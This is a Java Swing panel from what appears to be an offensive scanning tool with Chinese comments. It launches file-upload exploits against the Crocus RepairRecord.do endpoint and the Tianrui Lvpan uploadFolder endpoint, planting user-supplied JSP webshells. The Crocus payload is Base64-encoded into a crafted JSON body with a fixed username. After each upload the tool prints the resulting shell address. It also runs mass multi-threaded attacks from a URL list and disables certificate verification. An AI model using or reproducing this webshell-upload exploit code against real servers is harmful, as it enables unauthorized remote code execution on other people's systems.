package com.httprequest.gui;

import javax.swing.*;
import java.awt.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.TimeUnit;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import javax.net.ssl.HttpsURLConnection;
import java.util.ArrayList;

public class FileUploadPOCPanel extends JPanel {
    private JTextArea responseArea;
    private JTextArea shellContentArea; // Shell内容输入区域
    private JLabel shellContentLabel; // Shell内容标签
    private JTextField threadCountField; // 线程数输入框
    private JLabel threadCountLabel; // 线程数标签
    private JTextField shellFileNameField; // Shell文件名输入框
    private JLabel shellFileNameLabel; // Shell文件名标签
    private JComboBox<String> pocTypeComboBox; // POC类型选择下拉列表
    private JLabel pocTypeLabel; // POC类型标签
    private volatile boolean stopRequested = false;
    
    // 全局变量定义
    private String agreement; // 存放请求协议是http还是https
    private String ip; // 存放当前请求的ip地址
    private int port; // 存放当前请求地址的端口信息

    public FileUploadPOCPanel() {
        initComponents();
    }

    private void initComponents() {
        setLayout(new BorderLayout());
        
        // 创建顶部面板
        JPanel topPanel = new JPanel(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.anchor = GridBagConstraints.WEST;

        // POC类型选择
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.gridwidth = 1;
        pocTypeLabel = new JLabel("POC类型:");
        topPanel.add(pocTypeLabel, gbc);

        gbc.gridx = 1;
        gbc.gridy = 0;
        gbc.gridwidth = 1;
        gbc.weightx = 0;
        pocTypeComboBox = new JComboBox<>(new String[]{"不使用", "Crocus系统RepairRecord.do文件上传", "天锐绿盘云文档安全管理uploadFolder存在文件上传"});
        topPanel.add(pocTypeComboBox, gbc);

        // Shell内容输入区域
        gbc.gridx = 0;
        gbc.gridy = 1;
        gbc.gridwidth = 1;
        shellContentLabel = new JLabel("Shell内容:");
        topPanel.add(shellContentLabel, gbc);
        
        gbc.gridx = 1;
        gbc.gridy = 1;
        gbc.gridwidth = 4; // 占据更多列空间
        gbc.fill = GridBagConstraints.BOTH;
        gbc.weightx = 1.0; // 设置水平权重，让输入框能够扩展
        shellContentArea = new JTextArea(5, 50); // 增加columns值到50
        shellContentArea.setLineWrap(true);
        shellContentArea.setWrapStyleWord(true);
        JScrollPane shellScrollPane = new JScrollPane(shellContentArea);
        topPanel.add(shellScrollPane, gbc);
        
        // 线程数输入框
        gbc.gridx = 0;
        gbc.gridy = 2;
        gbc.gridwidth = 1;
        gbc.fill = GridBagConstraints.NONE;
        gbc.weightx = 0; // 重置权重
        threadCountLabel = new JLabel("线程数:");
        topPanel.add(threadCountLabel, gbc);
        
        gbc.gridx = 1;
        gbc.gridy = 2;
        gbc.gridwidth = 1;
        threadCountField = new JTextField("10", 5); // 默认10线程
        topPanel.add(threadCountField, gbc);
        
        // Shell文件名输入框
        gbc.gridx = 2;
        gbc.gridy = 2;
        gbc.gridwidth = 1;
        gbc.fill = GridBagConstraints.NONE;
        shellFileNameLabel = new JLabel("Shell文件名:");
        topPanel.add(shellFileNameLabel, gbc);
        
        gbc.gridx = 3;
        gbc.gridy = 2;
        gbc.gridwidth = 1;
        shellFileNameField = new JTextField("a.jsp", 10); // 默认文件名a.jsp
        topPanel.add(shellFileNameField, gbc);
        
        // 添加导出按钮
        gbc.gridx = 4;
        gbc.gridy = 2;
        gbc.gridwidth = 1;
        gbc.weightx = 0; // 重置权重
        JButton exportButton = new JButton("导出结果");
        exportButton.addActionListener(e -> exportResults());
        topPanel.add(exportButton, gbc);

        // 响应显示区域
        responseArea = new JTextArea();
        responseArea.setEditable(false);
        JScrollPane responseScrollPane = new JScrollPane(responseArea);

        add(topPanel, BorderLayout.NORTH);
        add(responseScrollPane, BorderLayout.CENTER);
    }
    
    // 导出结果到txt文件
    private void exportResults() {
        try {
            // 创建文件选择器
            JFileChooser fileChooser = new JFileChooser();
            fileChooser.setDialogTitle("保存文件");
            fileChooser.setSelectedFile(new File("result.txt"));
            
            // 显示保存对话框
            int userSelection = fileChooser.showSaveDialog(this);
            
            if (userSelection == JFileChooser.APPROVE_OPTION) {
                File fileToSave = fileChooser.getSelectedFile();
                
                // 确保文件扩展名为.txt
                String fileName = fileToSave.getAbsolutePath();
                if (!fileName.endsWith(".txt")) {
                    fileName += ".txt";
                    fileToSave = new File(fileName);
                }
                
                // 写入文件
                try (java.io.FileWriter writer = new java.io.FileWriter(fileToSave)) {
                    writer.write(responseArea.getText());
                    JOptionPane.showMessageDialog(this, "结果已成功导出到: " + fileName);
                }
            }
        } catch (Exception ex) {
            JOptionPane.showMessageDialog(this, "导出失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
        }
    }

    public void sendFileUploadPoC() {
        // 重置停止请求标志
        stopRequested = false;
        
        // 获取选择的POC类型
        String selectedPocType = (String)pocTypeComboBox.getSelectedItem();
        
        // 如果选择了"不使用"，则直接返回
        if ("不使用".equals(selectedPocType)) {
            return;
        }
        
        // 获取HttpRequestGUI中的URL
        HttpRequestGUI gui = (HttpRequestGUI) SwingUtilities.getWindowAncestor(this);
        String baseUrl = gui.getUrl();
        
        if (baseUrl == null || baseUrl.isEmpty()) {
            SwingUtilities.invokeLater(() -> {
                responseArea.setText("错误: 请求地址不能为空");
            });
            return;
        }
        
        // 启用停止按钮
        SwingUtilities.invokeLater(() -> {
            gui.setStopButtonEnabled(true);
        });
        
        // 应用代理设置
        ProxySettings proxySettings = gui.getProxySettings();
        if (proxySettings != null) {
            proxySettings.applyProxySettings();
        }
        
        // 在后台线程中执行请求，避免阻塞UI线程
        new Thread(() -> {
            try {
                // 检查baseUrl是否为文件路径
                File urlFile = new File(baseUrl);
                if (urlFile.exists() && urlFile.isFile()) {
                    // 从文件中逐行读取URL并发送请求
                    sendRequestsFromFile(urlFile, gui);
                } else {
                    // 发送单个请求
                    sendSingleRequest(baseUrl, gui);
                }
            } catch (Exception e) {
                SwingUtilities.invokeLater(() -> {
                    responseArea.append("\n请求过程中发生异常: " + e.getMessage() + "\n");
                });
            } finally {
                // 请求完成后禁用停止按钮
                SwingUtilities.invokeLater(() -> {
                    gui.setStopButtonEnabled(false);
                });
            }
        }).start();
    }
    
    // 从文件中逐行读取URL并发送请求
    private void sendRequestsFromFile(File urlFile, HttpRequestGUI gui) {
        try (BufferedReader reader = new BufferedReader(new FileReader(urlFile))) {
            String line;
            
            // 获取用户设置的线程数，默认为10
            int threadCount = 10;
            try {
                threadCount = Integer.parseInt(threadCountField.getText());
            } catch (NumberFormatException e) {
                // 如果输入的不是有效数字，使用默认值10
            }
            
            // 使用用户设置的线程数创建线程池
            ExecutorService executor = Executors.newFixedThreadPool(threadCount);
            List<Future<String>> futures = new ArrayList<>();
            List<String> urls = new ArrayList<>();
            
            // 逐行读取URL并立即提交请求任务到线程池
            while ((line = reader.readLine()) != null && !stopRequested) {
                line = line.trim();
                if (!line.isEmpty()) {
                    // 检查URL是否包含协议，如果没有则添加http://
                    if (!line.contains("://")) {
                        line = "http://" + line;
                    }
                    
                    final String finalUrl = line;
                    urls.add(finalUrl);
                    
                    Future<String> future = executor.submit(() -> {
                        if (stopRequested) {
                            return "URL: " + finalUrl + "\n请求被取消\n\n----------------------------------------\n\n";
                        }
                        try {
                            // 使用sendSingleRequestAndGetResponse获取请求结果
                            String result = sendSingleRequestAndGetResponse(finalUrl, gui);
                            return "URL: " + finalUrl + "\n" + result + "\n----------------------------------------\n\n";
                        } catch (Exception e) {
                            return "URL: " + finalUrl + "\n请求失败: " + e.getMessage() + "\n\n----------------------------------------\n\n";
                        }
                    });
                    futures.add(future);
                }
            }
            
            // 关闭线程池，不再接受新任务
            executor.shutdown();
            
            // 收集所有结果
            for (int i = 0; i < futures.size(); i++) {
                final int index = i;
                if (stopRequested) {
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append("\n请求已被用户停止。\n");
                    });
                    // 取消未完成的任务
                    for (int j = index; j < futures.size(); j++) {
                        futures.get(j).cancel(true);
                    }
                    break;
                }
                
                try {
                    // 获取结果，设置超时以避免无限等待
                    final String result = futures.get(index).get(25, TimeUnit.SECONDS);
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append(result);
                    });
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append("URL: " + urls.get(index) + "\n请求被中断\n\n----------------------------------------\n\n");
                    });
                    // 取消剩余任务
                    for (int j = index + 1; j < futures.size(); j++) {
                        futures.get(j).cancel(true);
                    }
                    break;
                } catch (ExecutionException e) {
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append("URL: " + urls.get(index) + "\n请求执行异常: " + e.getCause().getMessage() + "\n\n----------------------------------------\n\n");
                    });
                } catch (TimeoutException e) {
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append("URL: " + urls.get(index) + "\n请求超时\n\n----------------------------------------\n\n");
                    });
                    // 取消当前任务
                    futures.get(index).cancel(true);
                }
            }
            
            // 请求完成后禁用停止按钮
            SwingUtilities.invokeLater(() -> {
                gui.setStopButtonEnabled(false);
                responseArea.append("\n所有请求已结束\n");
            });
            
        } catch (IOException e) {
            SwingUtilities.invokeLater(() -> {
                responseArea.setText("读取文件失败: " + e.getMessage());
                gui.setStopButtonEnabled(false);
            });
        }
    }
    
    // 发送请求并流式显示响应
    private void sendRequestWithStreamDisplay(String baseUrl, HttpRequestGUI gui) throws Exception {
        // 首先检查是否已请求停止
        if (stopRequested) {
            final String cancelledResult = "URL: " + baseUrl + "\n请求被取消\n\n----------------------------------------\n\n";
            SwingUtilities.invokeLater(() -> {
                responseArea.append(cancelledResult);
            });
            return;
        }
        
        // 创建一个独立的线程来执行请求
        Thread requestThread = new Thread(() -> {
            try {
                // 获取用户在下拉列表中选择的POC类型
                String selectedPocType = getSelectedPocType();
                // 获取用户输入的Shell内容
                String shellContent = shellContentArea.getText();
                
                // 再次检查是否已请求停止
                if (stopRequested) {
                    final String cancelledResult = "URL: " + baseUrl + "\n请求被取消\n\n----------------------------------------\n\n";
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append(cancelledResult);
                    });
                    return;
                }
                
                // 根据选择的POC类型执行不同的操作
                if ("Crocus系统RepairRecord.do文件上传".equals(selectedPocType)) {
                    try {
                        // 对Shell内容进行Base64编码
                        String base64EncodedShell = Base64.getEncoder().encodeToString(shellContent.getBytes("UTF-8"));
                        
                        // 更新请求URL
                        String requestUrl = baseUrl + "/RepairRecord.do?Action=imageupload";
                        String requestMethod = "POST";
                        
                        URL url = new URL(requestUrl);
                        
                        // 设置全局变量
                        this.agreement = url.getProtocol().toLowerCase(); // 设置请求协议
                        this.ip = url.getHost(); // 设置请求的IP地址
                        this.port = url.getPort() != -1 ? url.getPort() : ("https".equals(this.agreement) ? 443 : 80); // 设置请求端口
                        
                        HttpURLConnection connection;
                        
                        // 如果是HTTPS连接，设置信任所有证书的SSL上下文
                        if ("https".equals(this.agreement)) {
                            HttpsURLConnection httpsConnection = (HttpsURLConnection) url.openConnection();
                            try {
                                httpsConnection.setSSLSocketFactory(Utils.createAllTrustingSSLContext().getSocketFactory());
                                httpsConnection.setHostnameVerifier(Utils.createAllTrustingHostnameVerifier());
                            } catch (Exception e) {
                                // 处理异常
                                System.err.println("设置SSL上下文失败: " + e.getMessage());
                            }
                            connection = httpsConnection;
                        } else {
                            connection = (HttpURLConnection) url.openConnection();
                        }
                        
                        // 更新请求头
                        connection.setRequestMethod(requestMethod);
                        // 使用全局变量设置Host请求头
                        String requestHost = this.ip + ":" + this.port;
                        System.out.println("requestHost: " + requestHost);
                        connection.setRequestProperty("Host", requestHost);
                        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0");
                        connection.setRequestProperty("Accept", "*/*");
                        connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
                        connection.setRequestProperty("Connection", "close");
                        connection.setRequestProperty("Content-Type", "application/json");
                        connection.setDoOutput(true);
                        
                        // 设置JSON请求体，使用传入的base64EncodedShell
                        String jsonRequestBody = "{\n" +
                                                "  \"username\": \"streamax20020818\",\n" +
                                                "  \"license\": \"1\",\n" +
                                                "  \"chnnel\": 1,\n" +
                                                "  \"type\": 1,\n" +
                                                "  \"imsage\": \"" + base64EncodedShell + "\",\n" +
                                                "  \"picturename\": \"" + shellFileNameField.getText() + "\"\n" +
                                                "}";
                        
                        try (java.io.DataOutputStream dos = new java.io.DataOutputStream(connection.getOutputStream())) {
                            dos.writeBytes(jsonRequestBody);
                            dos.flush();
                        }
                        
                        // 设置连接和读取超时为20秒
                        connection.setConnectTimeout(20000);
                        connection.setReadTimeout(20000);

                        // 构建请求详情
                        final StringBuilder requestDetails = new StringBuilder();
                        // 添加原始请求头
                        requestDetails.append("原始请求头:\n");
                        requestDetails.append("POST " + url.getFile() + " HTTP/1.1\n");
                        // 显示当前请求的主机信息
                        requestDetails.append("Host: " + requestHost + "\n");
                        requestDetails.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\n");
                        requestDetails.append("Content-Type: application/json\n");
                        requestDetails.append("Accept-Encoding: gzip, deflate\n");
                        requestDetails.append("Accept: */*\n");
                        requestDetails.append("Connection: close\n\n");
                        
                        // 添加请求体信息
                        requestDetails.append("请求体:\n" + jsonRequestBody + "\n");
                        
                        // 构建所有需要显示的内容到一个临时缓冲区
                        final StringBuilder allContentToDisplay = new StringBuilder();
                        allContentToDisplay.append("请求详情:\n").append(requestDetails.toString()).append("\n");
                        
                        // 构建shell地址
                        String shellAddress = "shell地址：" + this.agreement + "://" + this.ip + ":" + this.port + "/SystemFile/PictureRecord/imageupload/" + shellFileNameField.getText() + "\n\n";
                        allContentToDisplay.append(shellAddress);

                        // 获取HTTP响应码
                        int responseCode = connection.getResponseCode();
                        
                        // 对于所有响应码（无论是成功还是失败），都显示完整的响应详情
                        StringBuilder responseInfo = new StringBuilder();
                        responseInfo.append("响应状态码: " ).append(responseCode).append("\n\n");
                         
                        // 获取响应头
                        responseInfo.append("响应头:\n");
                        for (int i = 0; ; i++) {
                            String key = connection.getHeaderFieldKey(i);
                            String value = connection.getHeaderField(i);
                            if (key == null && value == null) {
                                break;
                            }
                            responseInfo.append(key != null ? key : "Status").append(": " ).append(value).append("\n");
                        }
                         
                        responseInfo.append("\n响应体:\n");
                        allContentToDisplay.append(responseInfo.toString());
                         
                        // 一次性显示所有内容，确保顺序正确
                        final String contentToDisplay = allContentToDisplay.toString();
                        SwingUtilities.invokeLater(() -> {
                            responseArea.append(contentToDisplay);
                        });
                        
                        // 流式读取响应体并实时显示
                        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"))) {
                            String line;
                            while ((line = reader.readLine()) != null && !stopRequested) {
                                final String responseLine = line;
                                // 实时显示每一行响应
                                SwingUtilities.invokeLater(() -> {
                                    responseArea.append(responseLine + "\n");
                                });
                            }
                        }
                        
                        // 显示分隔线，表示一个请求结束
                        if (!stopRequested) {
                            SwingUtilities.invokeLater(() -> {
                                responseArea.append("\n----------------------------------------\n\n");
                            });
                        }
                        
                    } catch (Exception e) {
                        // 捕获异常并实时显示
                        if (!stopRequested) {
                            final String errorMessage;
                            if (e instanceof java.net.SocketTimeoutException) {
                                errorMessage = "请求超时\n\n";
                            } else {
                                errorMessage = "请求执行异常: " + e.getMessage() + "\n\n";
                            }
                            SwingUtilities.invokeLater(() -> {
                                responseArea.append(errorMessage);
                            });
                        }
                        throw e; // 重新抛出异常以便上层处理
                    }
                } else if ("天锐绿盘云文档安全管理uploadFolder存在文件上传".equals(selectedPocType)) {
                    try {
                        // 检查是否已请求停止
                        if (stopRequested) {
                            final String cancelledResult = "URL: " + baseUrl + "\n请求被取消\n\n----------------------------------------\n\n";
                            SwingUtilities.invokeLater(() -> {
                                responseArea.append(cancelledResult);
                            });
                            return;
                        }
                        
                        // 获取文件名输入框内容，默认为hello.jsp
                        String filename = shellFileNameField != null && !shellFileNameField.getText().trim().isEmpty() ? 
                            shellFileNameField.getText().trim() : "hello.jsp";
                          
                        // 构建响应信息，包含URL
                        StringBuilder fullResponse = new StringBuilder();
                        fullResponse.append("URL: " + baseUrl + "\n");
                        
                        // 从baseUrl中提取协议、IP和端口，构建shell地址并添加到响应中
                        URL url = new URL(baseUrl);
                        String agreement = url.getProtocol().toLowerCase(); // 请求协议
                        String ip = url.getHost(); // 请求的IP地址
                        int port = url.getPort() != -1 ? url.getPort() : ("https".equals(agreement) ? 443 : 80); // 请求端口
                        fullResponse.append("shell地址：" + agreement + "://" + ip + ":" + port + "/" + filename + "\n");
                           
                        // 调用天锐绿盘云文档安全管理uploadFolder文件上传POC，不进行base64编码
                        // 在发送请求前再次检查是否已请求停止
                        if (stopRequested) {
                            final String cancelledResult = "URL: " + baseUrl + "\n请求被取消\n\n----------------------------------------\n\n";
                            SwingUtilities.invokeLater(() -> {
                                responseArea.append(cancelledResult);
                            });
                            return;
                        }
                         
                        String result = com.httprequest.gui.POC.TianruiLvpanyunFileUpload.sendFileUploadRequest(baseUrl, shellContent, filename);
                         
                        if (!stopRequested) {
                            // 将结果添加到完整响应中
                            fullResponse.append(result);
                            fullResponse.append("\n\n----------------------------------------\n\n");
                               
                            // 请求完成后一次性显示完整响应
                            final String responseToDisplay = fullResponse.toString();
                            SwingUtilities.invokeLater(() -> {
                                responseArea.append(responseToDisplay);
                            });
                        }
                    } catch (Exception e) {
                        // 捕获异常并构建包含URL的错误信息
                        if (!stopRequested) {
                            final StringBuilder errorInfo = new StringBuilder();
                            errorInfo.append("URL: " + baseUrl + "\n");
                            errorInfo.append("请求执行异常: " + e.getMessage() + "\n\n");
                               
                            // 一次性显示错误信息
                            SwingUtilities.invokeLater(() -> {
                                responseArea.append(errorInfo.toString());
                            });
                        }
                        throw e; // 重新抛出异常以便上层处理
                    }
                }
            } catch (Exception e) {
                if (!stopRequested) {
                    final StringBuilder errorInfo = new StringBuilder();
                    errorInfo.append("URL: " + baseUrl + "\n");
                    errorInfo.append("请求执行异常: " + e.getMessage() + "\n\n");
                      
                    // 一次性显示错误信息
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append(errorInfo.toString());
                    });
                }
            } finally {
                // 请求完成后处理UI更新，但不要禁用停止按钮（除非是单请求）
                if (!stopRequested) {
                    // 只更新响应区域，不修改停止按钮状态
                    SwingUtilities.invokeLater(() -> {
                        responseArea.append("\n请求已完成\n");
                    });
                }
            }
        });
        
        // 启动请求线程
        requestThread.start();
        
        // 等待请求完成或直到收到停止请求
        while (requestThread.isAlive() && !stopRequested) {
            try {
                Thread.sleep(100); // 每100毫秒检查一次
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        
        // 如果请求仍在运行且收到了停止请求，显示取消消息
        if (stopRequested) {
            SwingUtilities.invokeLater(() -> {
                responseArea.append("\n请求已被用户停止。\n");
            });
        }
    }
    
    // 发送单个请求
    private void sendSingleRequest(String baseUrl, HttpRequestGUI gui) {
        try {
            String response = sendSingleRequestAndGetResponse(baseUrl, gui);
            SwingUtilities.invokeLater(() -> {
                responseArea.append(response);
            });
        } catch (Exception e) {
            SwingUtilities.invokeLater(() -> {
                responseArea.append("请求失败: " + e.getMessage());
            });
        } finally {
            // 请求完成后禁用停止按钮
            SwingUtilities.invokeLater(() -> {
                gui.setStopButtonEnabled(false);
                responseArea.append("\n所有请求已结束\n");
            });
        }
    }
    
    // 设置停止请求标志
    public void stopRequests() {
        stopRequested = true;
    }
    

    
    // 提供公共方法获取选中的POC类型
    public String getSelectedPocType() {
        return (String) pocTypeComboBox.getSelectedItem();
    }
    
    // 发送单个请求并返回响应
    private String sendSingleRequestAndGetResponse(String baseUrl, HttpRequestGUI gui) throws Exception {
        // 首先检查是否已请求停止
        if (stopRequested) {
            return "URL: " + baseUrl + "\n请求被取消\n\n----------------------------------------\n\n";
        }
        
        try {
            // 获取用户在下拉列表中选择的POC类型
            String selectedPocType = getSelectedPocType();
            // 获取用户输入的Shell内容
            String shellContent = shellContentArea.getText();
            
            // 根据选择的POC类型执行不同的操作
            if ("Crocus系统RepairRecord.do文件上传".equals(selectedPocType)) {
                // 对Shell内容进行Base64编码
                String base64EncodedShell = Base64.getEncoder().encodeToString(shellContent.getBytes("UTF-8"));
                return com.httprequest.gui.POC.CrocusRepairRecordUpload.sendFileUploadRequest(baseUrl, base64EncodedShell);
            } else if ("天锐绿盘云文档安全管理uploadFolder存在文件上传".equals(selectedPocType)) {
                // 检查是否已请求停止
                if (stopRequested) {
                    return "URL: " + baseUrl + "\n请求被取消\n\n----------------------------------------\n\n";
                }
                
                // 获取文件名输入框内容，默认为hello.jsp
                String filename = shellFileNameField != null && !shellFileNameField.getText().trim().isEmpty() ? 
                    shellFileNameField.getText().trim() : "hello.jsp";
                
                // 在发送请求前再次检查是否已请求停止
                if (stopRequested) {
                    return "URL: " + baseUrl + "\n请求被取消\n\n----------------------------------------\n\n";
                }
                
                // 调用天锐绿盘云文档安全管理uploadFolder文件上传POC，不进行base64编码
                return com.httprequest.gui.POC.TianruiLvpanyunFileUpload.sendFileUploadRequest(baseUrl, shellContent, filename);
            }
            
            return "";
        } catch (Exception e) {
            return "请求失败: " + e.getMessage();
        }
    }
}